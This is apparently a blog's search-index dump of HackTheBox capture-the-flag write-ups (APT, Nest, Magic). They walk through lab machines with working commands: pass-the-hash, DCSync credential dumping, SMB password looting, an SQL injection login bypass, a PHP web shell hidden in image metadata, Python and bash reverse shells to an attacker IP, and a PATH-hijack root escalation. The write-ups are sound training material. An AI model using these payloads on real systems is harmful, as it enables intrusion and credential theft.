APT$::HTB:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:1122334455667788 When there is no credentials are specified explicitly, Windows uses the current credentials.\nHowever, because Windows Defender is already running as SYSTEM (built-in local system), (afaik) it can not be downgraded to a lower privilege for authentication. It won’t authenticate using SYSTEM as well. Instead, it uses the machine/computer account for authentication. LocalSystem and NetworkService credentials use computer account for authentication.\nCracking NTLMv1 hash I can submit the hash to https://crack.sh/ with the following format.\nNTHASH:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384 It will automatically detect the input.\nNot even a minute passed, it sent me the result.\nThe key is d167c3238864b12f5f82feae86a7f798, it\u0026rsquo;s the NTLM hash/NThash that can be used for pass-the-hash attack.\nCredential Dumping NTLM Hash of a computer account can not be used for remote login. Instead, it can be used to perform DCSync attack using secretsdump.py. I\u0026rsquo;ll take only the administrator hash.\n→ root@iamf «~» «10.10.14.72» $ secretsdump.py \u0026#39;htb.local/APT$@apt\u0026#39; -hashes \u0026#39;d167c3238864b12f5f82feae86a7f798:d167c3238864b12f5f82feae86a7f798\u0026#39; -just-dc-user administrator Impacket v0.9.22.dev1+20200914.162022.81d44893 - Copyright 2020 SecureAuth Corporation [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets Administrator:500:aad3b435b51404eeaad3b435b51404ee:c370bddf384a691d811ff3495e8a72e2::: ...\u0026lt;snip\u0026gt;.. [*] Cleaning up... I can login into the box using evil-winrm with the administrator hash I obtained.\n→ root@iamf «~» «10.10.14.72» $ evil-winrm -i apt -u administrator -H c370bddf384a691d811ff3495e8a72e2 Evil-WinRM shell v2.4 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\Administrator\\Documents\u0026gt; type ..\\Desktop\\root.txt a1f204c405aea36388...[SNIP]... *Evil-WinRM* PS C:\\Users\\Administrator\\Documents\u0026gt;  References   https://book.hacktricks.xyz/pentesting/135-pentesting-msrpc\n  https://pubs.opengroup.org/onlinepubs/098759899/CHP21CHP.HTM\n  https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wpo/f8bb99d3-7755-4ab9-9510-09920196f8b0\n  https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/c25391af-f59e-40da-885e-cc84076673e4\n  https://airbus-cyber-security.com/the-oxid-resolver-part-1-remote-enumeration-of-network-interfaces-without-any-authentication/\n  https://en.wikipedia.org/wiki/NT_LAN_Manager\n  https://www.blackhat.com/presentations/win-usa-04/bh-win-04-seki-up2.pdf\n  https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4\n  https://www.trustedsec.com/blog/the-tale-of-the-lost-but-not-forgotten-undocumented-netsync-part-1/\n  https://techcommunity.microsoft.com/t5/ask-the-directory-services-team/machine-account-password-process/ba-p/396026\n  ","permalink":"https://fahmifj.github.io/writeups/hackthebox/htb-apt/","summary":"APT is an insane difficulty Windows machine from HackTheBox and it starts with enumeration on RPC services to get a list of MSRPC interfaces. One of the interface called IObjectExporter has a method named ServerAlive() can be abused to reveals the IPv6 address of the machine. There is a share contains a backup file of AD database and it can be extracted to obtain all the users' hashes. Brute-force attack is performed to obtain one valid credentials from these hashes.","tags":["OSCP-plus","Windows","Active-Directory","Domain-controller","MS-RPC","IOXIDResolver","zip2john","Windows-registry","NTLMv1","MpCmdRun","Responder","DCSync","reg.py","secretsdump.py","socat"],"title":"HackTheBox - APT"},{"content":"Nest is one of my favorite machines after Forest, I learned a lot about enumeration here, especially for SMB.\nNest starts with anonymous access on SMB, which allows me to obtain credentials of a temporary user. The credentials can be leveraged to read the other shares and obtain an encrypted password that belongs to c.smith. There is a VB project inside a directory that can not be reached unless you visit its full path. This project can be used to decrypt c.smith\u0026rsquo;s password. Enumerating c.smith home directory discovers a password for enabling debug mode of a custom application. With debug mode enabled, I\u0026rsquo;m able to read the application\u0026rsquo;s configuration and obtain encrypted Administrator password. By reversing the application, it allows me to decrypted the administrator password, and then use it gain administrator access.\nSkills Learned  SMB enumeration Alternate Data Stream Reversing .NET  Tools  Kali Linux (Attacking Machine) - https://www.kali.org/ Nmap - Preinstalled in Kali Linux smbclient - Preinstalled in Kali Linux Impacket - https://github.com/SecureAuthCorp/impacket  Reconnaissance Nmap nmap shows two ports open: SMB on port 445, and an unknown service on port 4386, but the fingerprints show it as \u0026lsquo;Reporting Service V1.2\u0026rsquo;.\n→ root@iamf «nest» «192.168.43.234» $ nmap -p1-5000 -sC -sV -oA nmap/nest 10.10.10.178 Nmap scan report for htb.nest (10.10.10.178) PORT STATE SERVICE VERSION 445/tcp open microsoft-ds? 4386/tcp open unknown | fingerprint-strings: | DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: | Reporting Service V1.2 | FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest, SIPOptions: | Reporting Service V1.2 | Unrecognised command | Help: | Reporting Service V1.2 | This service allows users to run queries against databases using the legacy HQK format | AVAILABLE COMMANDS --- | LIST | SETDIR \u0026lt;Directory_Name\u0026gt; | RUNQUERY \u0026lt;Query_ID\u0026gt; | DEBUG \u0026lt;Password\u0026gt; |_ HELP \u0026lt;Command\u0026gt; Host script results: |_clock-skew: -27s | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2020-04-28T15:16:46 |_ start_date: 2020-04-28T04:20:37 Enumeration TCP 445 - SMB Anonymous access is allowed here.\n→ root@iamf «nest» «192.168.43.234» $ smbclient -N -L //10.10.10.178/ Data share Enumeration on Data share with recurse mode shows two text files.\nOne of them is empty while the other one contains credentials for TempUser:Welcome2019.\n→ root@iamf «smb» «192.168.43.234» $ cat loot/Welcome\\ Email.txt We would like to extend a warm welcome to our newest member of staff, \u0026lt;FIRSTNAME\u0026gt; \u0026lt;SURNAME\u0026gt; You will find your home folder in the following location: \\\\HTB-NEST\\Users\\\u0026lt;USERNAME\u0026gt; If you have any issues accessing specific services or workstations, please inform the IT department and use the credentials below until all systems have been set up for you. Username: TempUser Password: welcome2019 Thank you HR With TempUsers, I could access the Secure$ share.\n Sorry if you annoyed by the red box, me too.\n Unfortunately, once I got to Secure$ share, I couldn\u0026rsquo;t list any single directory.\n→ root@iamf «smb» «192.168.43.234» $ smbclient -U \u0026#39;TempUser%welcome2019\u0026#39; //10.10.10.178/Secure$ Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; recurse on smb: \\\u0026gt; ls NT_STATUS_ACCESS_DENIED listing \\Finance\\* NT_STATUS_ACCESS_DENIED listing \\HR\\* NT_STATUS_ACCESS_DENIED listing \\IT\\* On the other hand, I do user enumeration with rpcclient.\nWith a little knowledge of scripting, I can filter the user.\n→ root@iamf «nest» «192.168.43.234» $ rpcclient -U \u0026#39;TempUser%welcome2019\u0026#39; -c \u0026#39;enumdomusers;quit\u0026#39; 10.10.10.178 | tr -d \u0026#39;[]\u0026#39; | cut -d \u0026#39;:\u0026#39; -f2 | cut -d \u0026#39; \u0026#39; -f1 Administrator C.Smith Guest Service_HQK TempUser I did a password spray using a simple bash script with a pattern of username:username, but no luck\n#!/bin/bash for u in `cat rpcusers.txt`; do echo -n “[*] user : $u “ \u0026amp;\u0026amp; rpcclient -U “$u%$u” -c “getusername;quit” 10.10.10.178 done I also check on users' information to find a plain password in the description, but end up knowing the user flag is on c.smith.\nI went back to SMB, I decided to download all the content in the Data share.\n→ root@iamf «loot» «192.168.43.234» $ smbget -R smb://10.10.10.178/Data/ -U TempUser # or use mget * inside smbclient Here is the folder structure on Data\n→ root@iamf «Data» «192.168.43.234» $ tree . ├── IT │ ├── Archive │ ├── Configs │ │ ├── Adobe │ │ │ ├── editing.xml │ │ │ ├── Options.txt │ │ │ ├── projects.xml │ │ │ └── settings.xml │ │ ├── Atlas │ │ │ └── Temp.XML │ │ ├── DLink │ │ ├── Microsoft │ │ │ └── Options.xml │ │ ├── NotepadPlusPlus │ │ │ ├── config.xml │ │ │ └── shortcuts.xml │ │ ├── RU Scanner │ │ │ └── RU_config.xml │ │ └── Server Manager │ ├── Installs │ ├── Reports │ └── Tools ├── Production ├── Reports └── Shared ├── Maintenance │ └── Maintenance Alerts.txt └── Templates ├── HR │ └── Welcome Email.txt └── Marketing Notepad++ config on Data/IT/Configs/NotepadPlusPlus/config.xml contains interesting path.\n...\u0026lt;SNIP\u0026gt;... \u0026lt;History nbMaxFile=\u0026#34;15\u0026#34; inSubMenu=\u0026#34;no\u0026#34; customLength=\u0026#34;-1\u0026#34;\u0026gt; \u0026lt;File filename=\u0026#34;C:\\windows\\System32\\drivers\\etc\\hosts\u0026#34; /\u0026gt; \u0026lt;File filename=\u0026#34;\\\\HTB-NEST\\Secure$\\IT\\Carl\\Temp.txt\u0026#34; /\u0026gt; \u0026lt;File filename=\u0026#34;C:\\Users\\C.Smith\\Desktop\\todo.txt\u0026#34; /\u0026gt; \u0026lt;/History\u0026gt; \u0026lt;/NotepadPlus\u0026gt; Next, on /Data/IT/Configs/RU Scanner/RU_config.xml, I found a password that belongs to c.smith\n→ root@iamf «RU Scanner» «192.168.43.234» $ cat RU_config.xml \u0026lt;?xml version=\u0026#34;1.0\u0026#34;?\u0026gt; \u0026lt;ConfigFile xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xmlns:xsd=\u0026#34;http://www.w3.org/2001/XMLSchema\u0026#34;\u0026gt; \u0026lt;Port\u0026gt;389\u0026lt;/Port\u0026gt; \u0026lt;Username\u0026gt;c.smith\u0026lt;/Username\u0026gt; \u0026lt;Password\u0026gt;fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=\u0026lt;/Password\u0026gt; \u0026lt;/ConfigFile\u0026gt; It looks like a base64 encoded at first, but it is encrypted:\n→ root@iamf «RU Scanner» «192.168.43.234» $ echo \u0026#39;fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=\u0026#39; | base64 -d }13☺□♥□=X□J□BA□↓☺X*□Wc□f□□□?βc◄ Secure$ share User carl doesn\u0026rsquo;t appear on my enumeration with rpcclient, so after discovering this path \\\\HTB-NEST\\Secure$\\IT\\Carl\\, I went back to Secure$ share and performed a recursive download there.\n→ root@iamf «Data» «192.168.43.234» $ smbget -R smb://10.10.10.178/Secure$/IT/Carl/ -U TempUser Here is the Secure$ structure.\n→ root@iamf «Secure$» «192.168.43.234» $ tree . ├── Docs │ ├── ip.txt │ └── mmc.txt ├── Reports └── VB Projects ├── Production └── WIP └── RU ├── RUScanner │ ├── bin │ │ ├── Debug │ │ └── Release │ ├── ConfigFile.vb │ ├── Module1.vb │ ├── My Project │ │ ├── Application.Designer.vb │ │ ├── Application.myapp │ │ ├── AssemblyInfo.vb │ │ ├── Resources.Designer.vb │ │ ├── Resources.resx │ │ ├── Settings.Designer.vb │ │ └── Settings.settings │ ├── obj │ │ └── x86 │ ├── RU Scanner.vbproj │ ├── RU Scanner.vbproj.user │ ├── SsoIntegration.vb │ └── Utils.vb └── RUScanner.sln I just downloaded a VB Project. Based on Module1.vb\u0026rsquo;s content, RU_config.xml is loaded to the application, and from this line .Password = Utils.DecryptString(Config.Password), I know this application able to decrypt c.smith\u0026rsquo;s password.\n→ root@iamf «WIP» «192.168.43.234» $ cat RU/RUScanner/Module1.vb Module Module1 Sub Main() Dim Config As ConfigFile = ConfigFile.LoadFromFile(\u0026#34;RU_Config.xml\u0026#34;) Dim test As New SsoIntegration With {.Username = Config.Username, .Password = Utils.DecryptString(Config.Password)} End Sub End Module Foothold Access as c.smith Decrypting c.smith password The encrypted password can be decrypted easily by taking out the utils class and the decrypt function from Utils.vb, then call it on the main function. I used https://dotnetfiddle.net/ for this.\nHere is how it looks like.\nImports System Imports System.Text Imports System.Security.Cryptography Public Module Module1 Public Sub Main() Dim encryptedPassword encryptedPassword = \u0026#34;fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=\u0026#34; Console.WriteLine(\u0026#34;Decrypted Password: \u0026#34; +Utils.DecryptString(encryptedPassword)) End Sub End Module Public Class Utils Public Shared Function DecryptString(EncryptedString As String) As String If String.IsNullOrEmpty(EncryptedString) Then Return String.Empty Else Return Decrypt(EncryptedString, \u0026#34;N3st22\u0026#34;, \u0026#34;88552299\u0026#34;, 2, \u0026#34;464R5DFA5DL6LE28\u0026#34;, 256) End If End Function Public Shared Function Decrypt(ByVal cipherText As String, _ ByVal passPhrase As String, _ ByVal saltValue As String, _ ByVal passwordIterations As Integer, _ ByVal initVector As String, _ ByVal keySize As Integer) _ As String Dim initVectorBytes As Byte() initVectorBytes = Encoding.ASCII.GetBytes(initVector) Dim saltValueBytes As Byte() saltValueBytes = Encoding.ASCII.GetBytes(saltValue) Dim cipherTextBytes As Byte() cipherTextBytes = Convert.FromBase64String(cipherText) Dim password As New Rfc2898DeriveBytes(passPhrase, _ saltValueBytes, _ passwordIterations) Dim keyBytes As Byte() keyBytes = password.GetBytes(CInt(keySize / 8)) Dim symmetricKey As New AesCryptoServiceProvider symmetricKey.Mode = CipherMode.CBC Dim decryptor As ICryptoTransform decryptor = symmetricKey.CreateDecryptor(keyBytes, initVectorBytes) Dim memoryStream As IO.MemoryStream memoryStream = New IO.MemoryStream(cipherTextBytes) Dim cryptoStream As CryptoStream cryptoStream = New CryptoStream(memoryStream, _ decryptor, _ CryptoStreamMode.Read) Dim plainTextBytes As Byte() ReDim plainTextBytes(cipherTextBytes.Length) Dim decryptedByteCount As Integer decryptedByteCount = cryptoStream.Read(plainTextBytes, _ 0, _ plainTextBytes.Length) memoryStream.Close() cryptoStream.Close() Dim plainText As String plainText = Encoding.ASCII.GetString(plainTextBytes, _ 0, _ decryptedByteCount) Return plainText End Function End Class Now I have c.smith\u0026rsquo;s password, xRxRxPANCAK3SxRxRx\nUsers share With c.smith credentials, I do more enumeration on SMB. First, I\u0026rsquo;ll look into the c.smith home directory.\n→ root@iamf «smb» «192.168.43.234» $ smbclient -U \u0026#39;c.smith%xRxRxPANCAK3SxRxRx\u0026#39; //10.10.10.178/Users Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\C.Smith\\\u0026gt; dir . D 0 Sun Jan 26 02:21:44 2020 .. D 0 Sun Jan 26 02:21:44 2020 HQK Reporting D 0 Thu Aug 8 19:06:17 2019 user.txt A 32 Thu Aug 8 19:05:24 2019 I downloaded those files recursively to my machine.\n→ root@iamf «c.smith» «192.168.43.234» $ tree . ├── HQK Reporting │ ├── AD Integration Module │ │ └── HqkLdap.exe │ ├── Debug Mode Password.txt │ └── HQK_Config_Backup.xml └── user.txt user.txt is the user flag.\n→ root@iamf «c.smith» «192.168.43.234» $ cat user.txt cf71b25404be5d84fd827e05f426e987 HQK_Config_Backup.xml doesn\u0026rsquo;t contains any useful information\n→ root@iamf «c.smith» «192.168.43.234» $ cat HQK\\ Reporting/HQK_Config_Backup.xml \u0026lt;?xml version=\u0026#34;1.0\u0026#34;?\u0026gt; \u0026lt;ServiceSettings xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xmlns:xsd=\u0026#34;http://www.w3.org/2001/XMLSchema\u0026#34;\u0026gt; \u0026lt;Port\u0026gt;4386\u0026lt;/Port\u0026gt; \u0026lt;QueryDirectory\u0026gt;C:\\Program Files\\HQK\\ALL QUERIES\u0026lt;/QueryDirectory\u0026gt; \u0026lt;/ServiceSettings\u0026gt; Debug Mode Password.txt is empty file. But when I thought it was empty, I asked a hint for this.\nThis file is embedded with Alternate Data Stream (ADS). By using the allinfo command on the SMB, I can see it contains another data stream, Password:$Data.\nTo get that stream, I can just append :Password:$Data at the end of the file name.\nsmb: \\C.Smith\\HQK Reporting\\\u0026gt; allinfo \u0026#34;Debug Mode Password.txt\u0026#34; altname: DEBUGM~1.TXT create_time: Thu Aug 8 07:06:12 PM 2019 EDT access_time: Thu Aug 8 07:06:12 PM 2019 EDT write_time: Thu Aug 8 07:08:17 PM 2019 EDT change_time: Thu Aug 8 07:08:17 PM 2019 EDT attributes: A (20) stream: [::$DATA], 0 bytes stream: [:Password:$DATA], 15 bytes smb: \\C.Smith\\HQK Reporting\\\u0026gt; get \u0026#34;Debug Mode Password.txt\u0026#34;:Password:$DATA getting file \\C.Smith\\HQK Reporting\\Debug Mode Password.txt:Password:$DATA of size 15 as Debug Mode Password.txt:Password:$DATA (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec) Now I can use the cat command to see the file content.\n→ root@iamf «c.smith» «192.168.43.234» $ cat Debug\\ Mode\\ Password.txt:Password:\\$DATA WBQ201953D8w Privilege Escalation Shell as NT Authority\\System Examination on HQK Reporting Service v1.2 When visiting http://10.10.10.178:4386/, the browser return a session timeout with \u0026gt; symbol, this could imply that this service is cli-based\nWith telnet, I could access this service.\n→ root@iamf «c.smith» «192.168.43.234» $ telnet 10.10.10.178 4386 With debug mode enabled, it shows more commands.\n\u0026gt;debug WBQ201953D8w Took me a minute to understand the commands, so basically\n LIST is to list directory, SHOWQUERY is to show file content, RUNQUERY is to execute. SETDIR is change directory.  Looking up into the LDAP directory, there\u0026rsquo;s ldap.conf that contains administrator credentials with another encrypted password.\nI have a copy of HqkLdap.exe on c.smith\u0026rsquo;s loot directory. So I decided to copy HqkLdap.exe from Kali to Windows and inspect the binary.I also created a copy of Ldap.conf.\nReversing HQKLdap.exe Running strings HqkLdap.exe againts the app, I discovered that it was built with.NET, and there are no hard-coded credentials.\nUsing immunity/ollydbg is waste of time because I can’t really read assembly, instead I have a very useful tool for reversing and debugging .NET applications called dnSpy. It\u0026rsquo;s free on Github.\n dnSpy: https://github.com/0xd4d/dnSpy/releases  For this I\u0026rsquo;ll go straight to the application main function.\nTo run this program properly, a config file, which is ldap.conf, must be served as an argument to the application, and it also needs the presences of HqkDbImport.exe (These two must exist in the same folder)\nSo if I run it and I don\u0026rsquo;t fulfill the check, it will complain like this:\nPS C:\\Users\\fahmi\\Desktop\u0026gt;.\\HqkLdap.exe Ldap.conf Please ensure the optional database import module is installed Next, I investigated the decrypt function, which was called on the main after the checks were completed.\nOn the next block, I see ldapSearchSettings.Password is assigned to ldap.password\nFrom here, what I can try is:\n Remove the part of codes that used to check for the existence of HqkDbImport.exe Add another line to print out the password from ldap.Password.  I\u0026rsquo;ll use the edit feature to edit the main class.\nAlso, I’ll get rid the line that used to check the existence of HqkDbImport.exe\npublic static void Main() { checked { try { if (MyProject.Application.CommandLineArgs.Count != 1) { Console.WriteLine(\u0026#34;Invalid number of command line arguments\u0026#34;); } else if (!File.Exists(MyProject.Application.CommandLineArgs[0])) { Console.WriteLine(\u0026#34;Specified config file does not exist\u0026#34;); } else { ...\u0026lt;snip\u0026gt; ... Then I’ll add a new line code on the main function at line 56 to print ldap.Password to the console.\nI tried to compile it back but then there was an error about the unassigned local variable \u0026lsquo;enumerator\u0026rsquo;, so I deleted that variable and tried to compile it back.\nIt succeeded and I can export the modified program.\nNow I can just run it and provide the ldap.conf as its argument and it works!\nThe password is: XtH4nkS4Pl4y1nGX\npsexec.py I can gain access as local system on the box using administrator account and the decrypted password with psexec.py\n→ root@iamf «c.smith» «192.168.43.234» $ psexec.py HTB-NEST/Administrator:XtH4nkS4Pl4y1nGX@10.10.10.178 Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation [*] Requesting shares on 10.10.10.178..... [*] Found writable share ADMIN$ [*] Uploading file nQyIIpWk.exe [*] Opening SVCManager on 10.10.10.178..... [*] Creating service gfCe on 10.10.10.178..... [*] Starting service gfCe..... [!] Press help for extra shell commands Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation. All rights reserved. C:\\Windows\\system32\u0026gt;whoami nt authority\\system  References  https://superuser.com/questions/1520250/read-alternate-data-streams-over-smb-with-linux  ","permalink":"https://fahmifj.github.io/writeups/hackthebox/htb-nest/","summary":"Nest is one of my favorite machines after Forest, I learned a lot about enumeration here, especially for SMB.\nNest starts with anonymous access on SMB, which allows me to obtain credentials of a temporary user. The credentials can be leveraged to read the other shares and obtain an encrypted password that belongs to c.smith. There is a VB project inside a directory that can not be reached unless you visit its full path.","tags":["OSCP-plus","Windows","SMB","Alternate-Data-Stream","dotN","VB","Reverse-engineering","dnSpy","psexec.py"],"title":"HackTheBox - Nest"},{"content":"Magic is a medium difficulty Linux machine from HackTheBox that features a php-based web application which is vulnerable to SQL injection for login bypass. The application upload feature has an upload filter that can be bypassed by embedding a web shell payload to a valid image file and adding a php extension to it. With that web shell, I\u0026rsquo;m able to gain a foothold on the system and use database credentials to dump admin password that is reused by a user on the box. For the root part, there\u0026rsquo;s a SUID binary that calls other binaries without their absolute path. This allows me to perform a path hijack attack and gain root access.\nSkills Learned  SQL injection Bypassing Upload Filter SUID exploitation  Tools  Kali Linux (Attacking Machine) - https://www.kali.org/ Nmap - Preinstalled in Kali Linux Exiftool - https://exiftool.org/  Reconnaissance Nmap → root@iamf «magic» «10.10.14.169» $ nmap -sC -sV -oA scans/magic 10.10.10.185 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA) | 256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA) |_ 256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Magic Portfolio Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel nmap found two ports open, an HTTP service on port 80 and SSH service on port 22\nEnumeration TCP 80 - Website The home page shows a bunch of images.\nBy clicking \u0026ldquo;Views image\u0026rdquo;, I know some images located on /images/uploads and some others on /images/fulls. At the bottom page, there\u0026rsquo;s a login button that points to /login.php\nCommon credentials don\u0026rsquo;t seem to work here.\nSQL injection - Login bypass on /login.php  The login form doesn\u0026rsquo;t allows spacing between character, but it can be tricked by copy and paste.\n A basic sql injection technique ' or 1 = 1 -- -  to bypass login is work against the login page.\n In MySQL, a space after a comment is a must -- [space], because of that I added -- - to make it clear.\n We can assume the back-end query would look like this:\n...\u0026lt;somephp\u0026gt;...$username=$_POST[\u0026#39;user\u0026#39;]$pwd=$_POST[\u0026#39;password\u0026#39;]...\u0026lt;somephp\u0026gt;...SELECTusername,passwordfromtable.userwhereusername=\u0026#39;$username\u0026#39;andpassword=\u0026#39;$pwd\u0026#39;If I assign ' or 1 = 1 -- -  as value of $username, it becomes:\nSELECTusername,passwordfromtable.userwhereusername=\u0026#39;\u0026#39;or1=1-- -\u0026#39; and password=\u0026#39;$pwd\u0026#39; Foothold Shell as www-data Upload filter bypass Upon a successful login, the site redirects me to /upload.php. It shows up with an upload form. It only accepts a valid image file.\nAfter some testing, I can bypass this upload filter by embedding my php shell on an image file (I took it from the web itself). This can be done by using exiftools.\n→ root@iamf «forest» «10.10.14.169» $ ./exiftool -Comment=\u0026#39;\u0026lt;?php echo \u0026#34;\u0026lt;pre\u0026gt;\u0026#34;; system($_GET[\u0026#34;cmd\u0026#34;]); ?\u0026gt;\u0026#39; iamf.jpg Next, I added .php extension right before the image extension (in my case it is .jpg, so it becomes filename.php.jpg).\nBack to /upload.php, now it accepts my php embedded image.\nI can find the uploaded file at http://htb.magic/images/uploads/.\nWhen I visit http://htb.magic/images/uploads/iamf.php.jpg?cmd=pwd, I can see the code execution is working\nShell access The machine has Python3 installed. With that, I can send a Python one liner reverse shell and set up a listener on port 443 to gain a foothold on the system.\nI\u0026rsquo;ll enter this URL on the browser.\nhttp://htb.magic/images/uploads/iamf.php.jpg?cmd=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.10.14.169%22,443));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/bash%22,%22-i%22]);%27\u0026#34; Now on my listener, it caught the shell\n→ root@iamf «magic» «10.10.14.169» $ nc -nvlp 443 listening on [any] 443 ... connect to [10.10.14.169] from (UNKNOWN) [10.10.10.185] 19448 bash: cannot set terminal process group (1327): Inappropriate ioctl for device bash: no job control in this shell $ id uid=33(www-data) gid=33(www-data) groups=33(www-data) Privilege Escalation Shell as theseus Enumeration I discovered a database configuration db.php5 that stores credentials after enumerating the current working directory with the find command.\n$ find . -type f -user www-data ...\u0026lt;SNIP\u0026gt;... ./var/www/Magic/db.php5 ...\u0026lt;SNIP\u0026gt;... Database dump I can use netstat to confirm that the MySQL server is currently running.\nwww-data@ubuntu:/var/www/Magic$ netstat -tlpn ...\u0026lt;SNIP\u0026gt;... Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name ...\u0026lt;SNIP\u0026gt;... tcp\t0\t0 127.0.0.1:3306 0.0.0.0:* LISTEN - ...\u0026lt;SNIP\u0026gt;... Unfortunately, mysql binary is not present in the box.\nInstead, I could use mysqldump to dump the database.\nwww-data@ubuntu:/var/www/Magic$ mysqldump Magic -u theseus -p\u0026#39;iamkingtheseus\u0026#39; ...\u0026lt;SNIP\u0026gt;... LOCK TABLES `login` WRITE; /*!40000 ALTER TABLE `login` DISABLE KEYS */; INSERT INTO `login` VALUES (1,\u0026#39;admin\u0026#39;,\u0026#39;Th3s3usW4sK1ng\u0026#39;); /*!40000 ALTER TABLE `login` ENABLE KEYS */; UNLOCK TABLES; /*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */; ...\u0026lt;SNIP\u0026gt;... Shell upgrade to SSH The password is reused by user theseus.\nwww-data@ubuntu:/var/www/Magic$ su theseus Password: theseus@ubuntu:/var/www/Magic$ Before enumeration, I would like to switch to SSH. First, I\u0026rsquo;ll generate a new ssh key.\n→ root@iamf «magic» «10.10.14.169» $ ssh-keygen -f theseus Then, I\u0026rsquo;ll add the newly generated public key to theseus\u0026rsquo;s authorized_keys.\ntheseus@ubuntu:~/.ssh$ echo 'ssh-rsa AAABBBCCCDDD' \u0026gt;\u0026gt; authorized_keys Now I can log in via SSH.\n→ root@iamf «magic» «10.10.14.169» $ ssh -i theseus@10.10.10.185 ...\u0026lt;SNIP\u0026gt;... theseus@ubuntu:~$ id uid=1000(theseus) gid=1000(theseus) groups=100(users),1000(theseus) Shell as root Enumeration Upon enumerating for SUID, there\u0026rsquo;s a binary that doesn\u0026rsquo;t seem a common SUID on Ubuntu.\ntheseus@ubuntu:~$ find / -perm -u=s -type f 2\u0026gt;/dev/null The sysinfo binary is owned by root, but it can be executed by the users group and theseus is a member of that group.\ntheseus@ubuntu:~$ ls -las /bin | grep sysinfo 24 -rwsr-x--- 1 root users 22040 Oct 21 2019 sysinfo I executed the binary and it returns some hardware information on screen that looks similar to lshw, free and other binary related to hardware info. A quick search on Google shows this:\nIt is the same header.\nRunning strings against sysinfo reveals it calls lshw, free, fdisk and some other bins without their absolute path. (I don\u0026rsquo;t have the screenshots to show what it looks like, also can\u0026rsquo;t find the logs on my notes, sorry)\n Absolute path: /bin/sysinfo \u0026ndash;\u0026gt; fixed path, can not be modified except global write access is permitted. (cmiiw) Relative path: sysinfo \u0026ndash;\u0026gt; resolved by user\u0026rsquo;s env, can be modified  SUID - Path Hijack Knowing the SUID binary uses relative path to call other binaries, I could abuse this by creating, for example, a fake lshw binary that contains a reverse shell.\nFirst, I’ll create a fake lshw in /tmp/iamf folder and add append one liner bash reverse shell.\ntheseus@ubuntu:/tmp$ mkdir iamf theseus@ubuntu:/tmp$ theseus@ubuntu:/tmp$ which lshw /bin/lshw Next, I’ll export /tmp/iamf to environment variable $PATH. Now If I call lshw, the OS will resolve it to the one on /tmp/iamf.\ntheseus@ubuntu:/tmp$ echo -e \u0026#39;#!/bin/sh bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.10.169/1234 0\u0026gt;\u0026amp;1\u0026#39; \u0026gt; iamf/lshw theseus@ubuntu:/tmp$ theseus@ubuntu:/tmp$ export PATH=/tmp/iamf:$PATH theseus@ubuntu:/tmp$ theseus@ubuntu:/tmp$ which lshw /tmp/iamf/lshw After that, I can just execute the sysinfo binary.\nHowever, it then just hangs.\ntheseus@ubuntu:/tmp$ sysinfo ====================Hardware Info==================== That is because it was pwned on my listener.\n→ root@iamf «magic» «10.10.14.169» $ nc -nvlp 1234 listening on [any] 1234 ... connect to [10.10.14.169] from (UNKNOWN) [10.10.10.185] 36094 root@ubuntu:/tmp/iamf# id uid=0(root) gid=0(root) groups=0(root),100(users),1000(theseus)    References  https://portswigger.net/support/using-sql-injection-to-bypass-authentication https://exiftool.org/ https://github.com/xapax/security/blob/master/bypass_image_upload.md https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/  ","permalink":"https://fahmifj.github.io/writeups/hackthebox/htb-magic/","summary":"Magic is a medium difficulty Linux machine from HackTheBox that features a php-based web application which is vulnerable to SQL injection for login bypass. The application upload feature has an upload filter that can be bypassed by embedding a web shell payload to a valid image file and adding a php extension to it. With that web shell, I\u0026rsquo;m able to gain a foothold on the system and use database credentials to dump admin password that is reused by a user on the box.","tags":["OSCP-like","OSWE-like","Linux","SQL-injection","Exiftool","Upload-bypass","Webshell","mysqldump","SUID","Path-hijack"],"title":"HackTheBox - Magic"},{"content":"Sauna is another Active Directory box with easy difficulty from Hack The Box that covers several Active Directory kill chain techniques, such as AS-REP roasting attack, finding credentials on 